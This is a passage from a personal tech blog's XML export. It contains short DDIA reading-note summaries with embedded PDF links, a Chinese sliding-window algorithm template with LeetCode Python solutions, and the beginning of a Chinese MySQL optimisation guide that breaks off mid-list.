<p>The chapter then delves into the challenges of data evolution, such as adding new fields or changing the format of existing fields. It explains how versioning and compatibility checks can be used to manage these challenges.</p>
<p>Next, the chapter introduces several data encoding formats, including Protocol Buffers, Thrift, Avro, and JSON. It discusses the pros and cons of each format and their suitability for different use cases.</p>
<p>Finally, the chapter concludes by emphasizing the importance of careful data encoding and evolution in distributed systems, as it can greatly impact the ability of the system to evolve and meet changing needs over time.<br>Please refer to the pdf reading noted in detailed:</p>
<iframe src='/js/src/pdfjs-legacy/web/viewer.html?file=/files/ddia-reading-notes-ch4.pdf' style='width:100%;height:100vh'></iframe>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Encoding</tag>
        <tag>Serialization</tag>
        <tag>Marshalling</tag>
      </tags>
  </entry>
  <entry>
    <title>滑动窗口解题模板</title>
    <url>/fundamental/algorithm/lc-sliding-window-template/</url>
    <content><![CDATA[<h2 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h2><p>类型 1： 给定两个字符串 s 和 t，找满足某种变化规律的字串&#x2F;最大字串&#x2F;最大字串长度等。</p>
<p>类型 2：给定字符串 s，查找满足某种条件的最大&#x2F;最小窗口。</p>
<span id="more"></span>

<h2 id="解题模板"><a href="#解题模板" class="headerlink" title="解题模板"></a>解题模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">slidingWindowTemplate</span>(<span class="params">s, t</span>):</span><br><span class="line">        <span class="comment"># 定义其他变量，存储结果，存储判断条件等变量</span></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> f(): <span class="comment"># case 1: slide end</span></span><br><span class="line">            <span class="comment"># do something</span></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> g(): <span class="comment"># case 2: slide begin</span></span><br><span class="line">                <span class="comment"># do something</span></span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line">                <span class="comment"># meet some condition</span></span><br></pre></td></tr></table></figure>

<p>模版变形：</p>
<ul>
<li>前后指针同步移动可以简化为一层循环</li>
<li>exactly(K) &#x3D; atMost(K) - atMost(K-1)</li>
</ul>
<h2 id="案例应用"><a href="#案例应用" class="headerlink" title="案例应用"></a>案例应用</h2><h3 id="案例-1：-Leetcode-424"><a href="#案例-1：-Leetcode-424" class="headerlink" title="案例 1： Leetcode 424"></a>案例 1： Leetcode 424</h3><p>Medium: <a href="https://leetcode.com/problems/longest-repeating-character-replacement/">Longest Repeating Character Replacement </a></p>
<p>给定一个字符串 s 和整数 k，求 s 变换 k 次后得到的最长重复子串是多长。其中变换规律是：每次操作可以将一个字符变化成任意字符。重复字符串是指所有字符都相同的字符串。</p>
<p><code>end</code> 每次滑动要做啥：</p>
<p>累计 s[end] 出现的次数。如果 s[end] 出现次数大于了窗口中最大重复次数，则更新最大重复次数。如果窗口长度大于 k + max_count 则需要移动 begin 指针。</p>
<p><code>begin</code> 指针移动要做啥：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">characterReplacement</span>(<span class="params">self, s: <span class="built_in">str</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line">        <span class="built_in">map</span> = collections.defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        max_count = max_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            c = s[end]</span><br><span class="line">            <span class="built_in">map</span>[c] += <span class="number">1</span></span><br><span class="line">            max_count = <span class="built_in">max</span>(max_count, <span class="built_in">map</span>[c])</span><br><span class="line"></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> end - begin &gt; k + max_count:</span><br><span class="line">                b = s[begin]</span><br><span class="line">                <span class="built_in">map</span>[b] -= <span class="number">1</span></span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, end - begin)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max_len</span><br></pre></td></tr></table></figure>

<h3 id="案例-2：Max-Consecutive-Ones-III"><a href="#案例-2：Max-Consecutive-Ones-III" class="headerlink" title="案例 2：Max Consecutive Ones III"></a>案例 2：Max Consecutive Ones III</h3><p>Medium: <a href="https://leetcode.com/problems/max-consecutive-ones-iii/solution/">https://leetcode.com/problems/max-consecutive-ones-iii/solution/</a></p>
<p>给定一个只有 0 和 1 的数组 A 和一个操作次数 K，每次操作可以从 0 变成 1，求在 k 次操作下最大子数组的长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestOnes</span>(<span class="params">self, A: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line">        max_len = <span class="number">0</span></span><br><span class="line">        nums_one = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; <span class="built_in">len</span>(A):</span><br><span class="line">            <span class="keyword">if</span> A[end] == <span class="number">1</span>:</span><br><span class="line">                nums_one += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> end - begin &gt; nums_one + k:</span><br><span class="line">                <span class="keyword">if</span> A[begin] == <span class="number">1</span>:</span><br><span class="line">                    nums_one -= <span class="number">1</span></span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, end - begin)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max_len</span><br></pre></td></tr></table></figure>

<h3 id="案例-3：Grumpy-Bookstore-Owner"><a href="#案例-3：Grumpy-Bookstore-Owner" class="headerlink" title="案例 3：Grumpy Bookstore Owner"></a>案例 3：Grumpy Bookstore Owner</h3><p>Medium: <a href="https://leetcode.com/problems/grumpy-bookstore-owner/">https://leetcode.com/problems/grumpy-bookstore-owner/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxSatisfied</span>(<span class="params">self, cus: <span class="type">List</span>[<span class="built_in">int</span>], gru: <span class="type">List</span>[<span class="built_in">int</span>], x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        init_sum = max_sum = <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">len</span>(cus)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> gru[i] == <span class="number">0</span>:</span><br><span class="line">                init_sum += cus[i]</span><br><span class="line"></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; n:</span><br><span class="line">            <span class="keyword">if</span> gru[end] == <span class="number">1</span>:</span><br><span class="line">                init_sum += cus[end]</span><br><span class="line">            <span class="comment"># [begin, end]</span></span><br><span class="line">            <span class="keyword">while</span> end - begin == x:</span><br><span class="line">                <span class="keyword">if</span> gru[begin] == <span class="number">1</span>:</span><br><span class="line">                    init_sum -= cus[begin]</span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            max_sum = <span class="built_in">max</span>(max_sum, init_sum)</span><br><span class="line">            end += <span class="number">1</span> <span class="comment"># 考虑清楚下次 end 移动之前要做哪些事情</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max_sum</span><br></pre></td></tr></table></figure>

<h3 id="案例-4：-Longest-Substring-Without-Repeating-Characters"><a href="#案例-4：-Longest-Substring-Without-Repeating-Characters" class="headerlink" title="案例 4： Longest Substring Without Repeating Characters"></a>案例 4： Longest Substring Without Repeating Characters</h3><p>Medium: <a href="https://leetcode.com/problems/longest-substring-without-repeating-characters/">https://leetcode.com/problems/longest-substring-without-repeating-characters/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="built_in">map</span> = collections.defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        max_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            e = s[end]</span><br><span class="line">            <span class="built_in">map</span>[e] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">map</span>[e] &gt; <span class="number">1</span>: <span class="comment"># e is repeating</span></span><br><span class="line">                counter += <span class="number">1</span> <span class="comment"># counter is number of repeating</span></span><br><span class="line"></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> counter &gt; <span class="number">0</span>: <span class="comment"># has repeated number</span></span><br><span class="line">                b = s[begin]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">map</span>[b] &gt; <span class="number">1</span>:</span><br><span class="line">                    counter -= <span class="number">1</span></span><br><span class="line">                <span class="built_in">map</span>[b] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, end - begin)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max_len</span><br></pre></td></tr></table></figure>

<h3 id="案例-5：-Get-Equal-Substrings-Within-Budget"><a href="#案例-5：-Get-Equal-Substrings-Within-Budget" class="headerlink" title="案例 5： Get Equal Substrings Within Budget"></a>案例 5： Get Equal Substrings Within Budget</h3><p>Medium: <a href="https://leetcode.com/problems/get-equal-substrings-within-budget/">https://leetcode.com/problems/get-equal-substrings-within-budget/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">equalSubstring</span>(<span class="params">self, s: <span class="built_in">str</span>, t: <span class="built_in">str</span>, cost: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line">        max_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            cost -= <span class="built_in">abs</span>(<span class="built_in">ord</span>(s[end]) - <span class="built_in">ord</span>(t[end]))</span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> cost &lt; <span class="number">0</span>:</span><br><span class="line">                cost += <span class="built_in">abs</span>(<span class="built_in">ord</span>(s[begin]) - <span class="built_in">ord</span>(t[begin]))</span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            max_len = <span class="built_in">max</span>(end - begin, max_len)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max_len</span><br></pre></td></tr></table></figure>

<h3 id="案例-6：Permutation-in-String"><a href="#案例-6：Permutation-in-String" class="headerlink" title="案例 6：Permutation in String"></a>案例 6：Permutation in String</h3><p>Medium: <a href="https://leetcode.com/problems/permutation-in-string/">https://leetcode.com/problems/permutation-in-string/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkInclusion</span>(<span class="params">self, s1: <span class="built_in">str</span>, s2: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        d = collections.Counter(s1)</span><br><span class="line">        counter = <span class="built_in">len</span>(d)</span><br><span class="line"></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; <span class="built_in">len</span>(s2):</span><br><span class="line">            e = s2[end]</span><br><span class="line">            <span class="keyword">if</span> e <span class="keyword">in</span> d:</span><br><span class="line">                d[e] -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> d[e] == <span class="number">0</span>:</span><br><span class="line">                    counter -= <span class="number">1</span></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> counter == <span class="number">0</span>:</span><br><span class="line">                b = s2[begin]</span><br><span class="line">                <span class="keyword">if</span> b <span class="keyword">in</span> d:</span><br><span class="line">                    d[b] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> d[b] &gt; <span class="number">0</span>:</span><br><span class="line">                        counter += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> end - begin == <span class="built_in">len</span>(s1):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="案例-7：-Minimum-Window-Substring"><a href="#案例-7：-Minimum-Window-Substring" class="headerlink" title="案例 7： Minimum Window Substring"></a>案例 7： Minimum Window Substring</h3><p><a href="https://leetcode.com/problems/minimum-window-substring/">https://leetcode.com/problems/minimum-window-substring/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minWindow</span>(<span class="params">self, s: <span class="built_in">str</span>, t: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="built_in">map</span> = collections.Counter(t)</span><br><span class="line"></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        begin = end = <span class="number">0</span></span><br><span class="line">        counter = <span class="built_in">len</span>(<span class="built_in">map</span>)</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        min_len = <span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> end &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            e = s[end]</span><br><span class="line">            <span class="keyword">if</span> e <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                <span class="built_in">map</span>[e] -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">map</span>[e] == <span class="number">0</span>:</span><br><span class="line">                    counter -= <span class="number">1</span></span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> counter == <span class="number">0</span>:</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                b = s[begin]</span><br><span class="line">                <span class="keyword">if</span> b <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                    <span class="built_in">map</span>[b] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">map</span>[b] &gt; <span class="number">0</span>:</span><br><span class="line">                        counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> end - begin &lt; min_len:</span><br><span class="line">                    min_len = end - begin</span><br><span class="line">                    start = begin</span><br><span class="line"></span><br><span class="line">                begin += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s[start: start + min_len] <span class="keyword">if</span> found <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Sliding Window</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA reading notes - chapter 5 Replication (Part I)</title>
    <url>/fundamental/storage/ddia-ch5-reading-notes-i/</url>
    <content><![CDATA[<p>Chapter 5 of this book covers the important topic of replication in the context of database systems. Replication is the process of creating and maintaining multiple copies of the same database on different servers. This is done to ensure data availability, improve performance, and provide fault tolerance.</p>
<p>The chapter starts by introducing the concept of replication and its benefits. It then goes on to explain the different types of replication, including master-slave, master-master, and multi-master replication. Each type is discussed in detail, with its advantages and disadvantages.</p>
<span id="more"></span>

<p>The chapter also covers the different replication topologies, such as star, tree, and mesh. It explains how each topology works and when it is appropriate to use them.</p>
<p>Next, the chapter discusses the issues related to replication, such as consistency, conflicts, and latency. It explains how these issues can be addressed using techniques such as locking, timestamping, and conflict resolution.</p>
<p>Finally, the chapter concludes with a discussion on the challenges of replication and how they can be overcome. It also provides some best practices for designing and implementing replication systems.</p>
<p>Please refer to pdf version to see more reading notes in detailed.</p>
<iframe src='/js/src/pdfjs-legacy/web/viewer.html?file=/files/ddia-reading-notes-ch5-i.pdf' style='width:100%;height:100vh'></iframe>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Replication</tag>
        <tag>Replica</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA reading notes - chapter 5 Replication (Part II)</title>
    <url>/fundamental/storage/ddia-ch5-reading-notes-ii/</url>
    <content><![CDATA[<p>Last section of Chapter 5 is Leaderless Replication. Leaderless Replication is a different approach compared to Single Leader Replication and Multi-Leader Replication, abandoning the concept of a leader and allowing any replica to directly accept writes from clients. In some leaderless replication implementations, the client directly sends its writes to several replicas, while in others, a coordinator node does this on behalf of the client.</p>
<span id="more"></span>

<p>This is the reading notes Leaderless Replication of DDIA. Please refer to pdf to dive into the detailed notes.</p>
<iframe src='/js/src/pdfjs-legacy/web/viewer.html?file=/files/ddia-reading-notes-ch5-ii.pdf' style='width:100%;height:100vh'></iframe>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Replication</tag>
        <tag>Leaderless</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA reading notes - chapter 6 Partitioning</title>
    <url>/fundamental/storage/ddia-ch6-reading-notes/</url>
    <content><![CDATA[<p>Chapter 6 of this book discusses the concept of data partitioning. The chapter explains how data partitioning can be used to improve the scalability and performance of distributed systems. The author describes various partitioning techniques and their advantages and disadvantages. The chapter also covers the challenges that arise when partitioning data, such as data skew and hotspots, and explains how to mitigate these issues. Overall, Chapter 6 provides a comprehensive overview of the partitioning strategies that can be used in modern distributed systems.</p>
<span id="more"></span>

<p>Please refer to pdf to dive into the detailed notes.</p>
<iframe src='/js/src/pdfjs-legacy/web/viewer.html?file=/files/ddia-reading-notes-ch6.pdf' style='width:100%;height:100vh'></iframe>]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Partitioning</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA reading notes - chapter 7 Transactions</title>
    <url>/fundamental/storage/ddia-ch7-reading-notes/</url>
    <content><![CDATA[<p>Chapter 6 of this book discusses Transactions. For decades, transactions have been the mechanism of choice for simplifying these issues. A transaction is a way for an application to group several reads and writes together into a logical unit. Conceptually, all the reads and writes in a transaction are executed as one operation: either the entire transaction succeeds (commit) or it fails(abort, rollback).<br>Transactions are created with a purpose: to simplify the programming model for applications accessing a database. By using transactions, the application is free to ignore specific potential error scenarios and concurrency issues.</p>
<span id="more"></span>

<p>Please refer to pdf to dive into the detailed notes.</p>
<iframe src='/js/src/pdfjs-legacy/web/viewer.html?file=/files/ddia-reading-notes-ch7.pdf' style='width:100%;height:100vh'></iframe>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>storage</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>Transaction</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 基础优化</title>
    <url>/fundamental/storage/mysql-optimize/</url>
    <content><![CDATA[<p>谈 MySQL 优化不如说是 MySQL 的基础学习，本文从以下几个方面探讨 MySQL 的使用技巧。</p>
<ul>
<li><p>建表优化</p>
</li>
<li><p>索引优化</p>
</li>
<li><p>SQL 优化</p>
</li>
<li><p>集群优化</p>
</li>
</ul>
<blockquote>
<p>MySQL 的优化思路：不查-&gt;少查-&gt;内存查-&gt;磁盘查-&gt;用索引-&gt;少排序</p>
</blockquote>
<span id="more"></span>

<h2 id="建表优化"><a href="#建表优化" class="headerlink" title="建表优化"></a>建表优化</h2><ol>
<li><p>定长与变长分离</p>
</li>
<li><p>常用字段和不常用字段分离</p>
</li>
<li><p>列类型选择：int &gt; date，time &gt; enum，char &gt; varchar &gt; blob，text</p>
<ul>
<li><p>int 定长，没有字符集差异</p>
</li>
<li><p>time 定长，运算快，节省空间。但需要考虑时区，写 SQL 时不方便 where &gt; ‘2005-10-12’;</p>
</li>
<li><p>enum 能起来约束值的目的，内部用整型来存储，但与 char 联查时，内部要经历串与值的转化</p>
</li>
<li><p>char 定长，需要考虑字符集和(排序)校对集</p>
</li>
<li><p>varchar， 不定长 要考虑字符集的转换与排序时的校对集，速度慢.</p>
</li>
<li><p>text&#x2F;blob 无法使用内存临时表(排序等操作只能在磁盘上进行)</p>
</li>
</ul>
<p> 比如性别存储选 tinyint:</p>
<pre><code> char(1) ， 3个字长字节
 enum(‘男’，’女’);  // 内部转成数字来存，多了一个转换过程
 tinyint() ，  // 0 1 2 // 定长1个字节.
</code></pre>
<p> 再如时间字段存储可以选择 INT 或 TIMESTAMP 或 DATETIME 类型，DATETIME 类型需要考虑时区差异造成的影响，而 INT 和 DATETIME 需要转化。具体选择要结合需求。</p>
</li>
<li><p>尽量避免用NULL()</p>
<p> 原因: NULL不利于索引和查询，查询时 <code>WHERE clo_name IS NULL </code>或者<code>WHERE clo_name IS NOT NULL </code>要用特殊的字节来标注。在磁盘上占据的空间其实更大(mysql5.7已对null做的改进，但查询仍是不便)。</p>
</li>
<li><p>加冗余地段 (触发器)</p>
<p> 在两表关联时，比如文章表<code>article</code>和评论表<code>comment</code>之间有关联，查询文章时想要查询文章下的评论总数，如果没有冗余字段需要联合查询，效率很低，因此可以在文章表中添加<code>com_count</code>冗余字段，该字段保存该文章下的评论总数。再添加和删除评论时用可以使用触发器对该字段进行修改。</p>
<p> 还有一中场景是有一个字段叫<code>name</code>保存的是中文姓名，查询时经常会对该字段按照拼音排序，如果选用 GBK 字符集默认就是拼音排序，但如果其他字符集可以加一个冗余的拼音字段，以达到快速排序的效果。</p>
</li>
<li><p>字符集选择</p>
<p> 如果确认全部是中文，不会使用多语言以及中文无法表示的字符，那么GBK是首选。采用UTF-8编码会占用3个字节，而GBK只需要2个字节。</p>
</li>
<li><p>引擎选择</p>
<p> MySQL 中常用的引擎有 MyISAM 和 InnoDB，其中 InnoDB 支持事务，MyISAM 不支持事务，选择引擎时除了考虑事务支持以外还要考索引类型的不同，MyISAM 默认为非聚簇索引，InnoDB 为非聚簇索引。</p>
</li>
</ol>
<h2 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li><p>主键</p>
<p>  主键，又称主码（英语：primary key 或 unique key）。数据库表中对储存数据对象予以唯一和完整标识的数据列或属性的组合。一个数据列只能有一个主键，且主键的取值不能缺失，即不能为空值（Null）。</p>
<p>  从技术的角度来看，primary key和unique key有很多相似之处。但还是有以下区别：</p>
<ul>
<li><p>作为 primary key 的列不能为Null。而 unique key 可以。</p>
</li>
<li><p>在一个表中只能有一个 primary key，而可以有多个 unique key。</p>
</li>
<li><p>更大的区别在逻辑设计上。primary key 一般在逻辑设计中用作记录标识，这也是设置 primary key 的本来用意。而 unique key 只是为了保证字段取值的唯一性。</p>
</li>
</ul>
</li>
<li><p>索引</p>
<p>  索引是数据库管理系统中一个排序的数据结构，以协助快速查询、更新数据库表中数据，MyISAM 和 InnoDB 引擎中的索引是 B-tree，Memory 引擎中的索引是 Hash。</p>
</li>
<li><p>外键</p>
<p>  外键（英语：foreign key，），又称外部键。其实在关系数据库中，每个数据表都是由关系来连系彼此的关系，父数据表（Parent Entity）的主键（primary key）会放在另一个数据表，当做属性以创建彼此的关系，而这个属性就是外键。</p>
<p>  比如1：1的关系，使用主表的id作为从表的主键。</p>
</li>
</ul>
<h3 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a>索引类型</h3><ul>
<li><p>Btree 索引和 Hash 索引</p>
<p>  Btree 适用于范围查找，相等比较，模糊查找 (&#x3D;， &gt;， &gt;&#x3D;， &lt;， &lt;&#x3D;， or BETWEEN operators)，查找速度O(lgn)</p>
<p>  Hash 适用于相等比较(equality comparisons: &#x3D;，&lt;&#x3D;&gt;)，查找速度 O(1)，只能在 Memory 引擎中使用。</p>
<p>  【误区】 在where条件常用的列上都加上索引</p>
<pre><code>  例：查询第3个栏目下 art_id 大于
  where cat_id = 3 and art_id &gt; 100 ;
    误: cat_id 上，和， art_id 上都加上索引.
    错: 只能用 上cat_id 或 art_id 索引，因为索引是相互独立的，同时只能用上 1 个。
</code></pre>
</li>
<li><p>联合索引</p>
<p>  如果 where 条件是根据多列进行筛选的，那么应该在多个列上建立一个索引，这就是联合索引。使用联合索引要注意建立时列的顺序，只有前一列上的索引被使用后一列索引才能被使用。如在 c1，c2，c3，c4 上建立联合索引</p>
<pre><code>  create table t4 (
      c1 tinyint(1) not null default 0，
      c2 tinyint(1) not null default 0，
      c3 tinyint(1) not null default 0，
      c4 tinyint(1) not null default 0，
      c5 tinyint(1) not null default 0，
      index c1234(c1，c2，c3，c4)
  );
</code></pre>
<p>  以下情况分别使用到的索引</p>
<pre><code>  A where c1=x and c2=x and c4&gt;x and c3=x
  B where c1=x and c2=x and c4=x order by c3
  C where c1=x and c4= x group by c3，c2
  D where c1=x and c5=x order by c2，c3
</code></pre>
<p>  A 中使用到了4个长度的键</p>
<p>  B 中查找使用 c1，c2，排序使用 c3</p>
<p>  C 中只有查找使用到 c1</p>
<p>  D 中查找使用 c1，分组使用 c2，c3</p>
</li>
<li><p>聚簇索引和非聚簇索引</p>
<p>  聚簇索引（也叫聚集索引）是一种索引，该索引中键值的逻辑顺序决定了表中相应行的物理顺序。简单理解就是主键和数据存储在一起，其他普通索引是对主键的引用，InnoDB 就属于聚簇索引。</p>
<p>  非聚簇索引是主键和其他普通索引都单独存储，索引是对数据行的引用。</p>
<ul>
<li><p>优势: 根据主键查询条目比较少时，不用回行(数据就在主键节点下)</p>
</li>
<li><p>劣势: 如果碰到不规则数据插入时，造成频繁的页分裂。</p>
</li>
</ul>
<p>  因此对于 InnoDB 而言，因为节点下有数据文件，因此节点的分裂将会比较慢。对于innodb的主键，尽量用整型，而且是递增的整型。如果是无规律的数据，将会产生的页的分裂，影响速度。</p>
</li>
</ul>
<h3 id="索引使用技巧"><a href="#索引使用技巧" class="headerlink" title="索引使用技巧"></a>索引使用技巧</h3><ul>
<li><p>索引覆盖</p>
<p>  索引覆盖是指如果查询的列恰好是索引的一部分，那么查询只需要在索引文件上进行，不需要回行到磁盘再找数据。这种查询速度非常快，称为”索引覆盖”。</p>
</li>
<li><p>索引的长度</p>
<p>  理想的索引应该是<code>查询频繁</code>、<code>区分度高</code>、<code>长度小</code>、<code> 尽量能覆盖常用查询字段</code>，比如在性别中建立索引是没有太大意义的，具体案例:<a href="https://www.v2ex.com/t/296130#reply36">https://www.v2ex.com/t/296130</a></p>
<p>  如果针对 char 类型字段建立索引，当字段长度太大时应根据查询需要截取部分长度建立索引（如果左模糊查询较多应从左开始建立索引），截取长度可以根据区分度来选择：</p>
<pre><code>  mysql&gt; select count(distinct left(word，2))/count(*) from tableName;
</code></pre>
</li>
<li><p>冗余索引</p>
<p>  冗余索引是指2个索引所覆盖的列有重叠， 称为冗余索引</p>
<p>  比如文章与标签表</p>
<pre><code>  +------+-------+------+
  | id   | artid | tag  |
  +------+-------+------+
  |    1 |     1 | PHP  |
  |    2 |     1 | nux  |
  |    3 |     2 | SQl  |
  |    4 |     2 | Orac |
  +------+-------+------+
</code></pre>
<p>  在实际使用中，有 2 种查询</p>
<pre><code>  artid--- 查询文章的 ---tag
  tag--- 查询文章的 ---artid

  select tag from t11 where artid=2;
  select artid from t11 where tag=&#39;PHP&#39;;
</code></pre>
<p>  这种查询方式在博客中是很常用的，如果利用建立联合索引往往可以使用索引覆盖达到高效查询。</p>
</li>
<li><p>避免隐式转换</p>
<p>  隐式转换是指 SQL 查询条件中的传入值与对应字段的数据定义不一致导致索引无法使用。常见隐士转换如字段的表结构定义为字符类型，但 SQL 传入值为数字；或者是字段定义 collation 为区分大小写，在多表关联的场景下，其表的关联字段大小写敏感定义各不相同。隐式转换会导致索引无法使用，进而出现上述慢 SQL 堆积数据库连接数跑满的情况。</p>
<p>  由于 MySQL 不支持函数索引，在开发时要避免在查询条件加入函数，例如 date(gmt_create)。</p>
</li>
</ul>
<h2 id="SQL-优化"><a href="#SQL-优化" class="headerlink" title="SQL 优化"></a>SQL 优化</h2><ul>
<li><p>使用 profiling 查看执行时间</p>
</li>
<li><p>使用 explain 查看执行计划</p>
</li>
<li><p>LIMIT 优化</p>
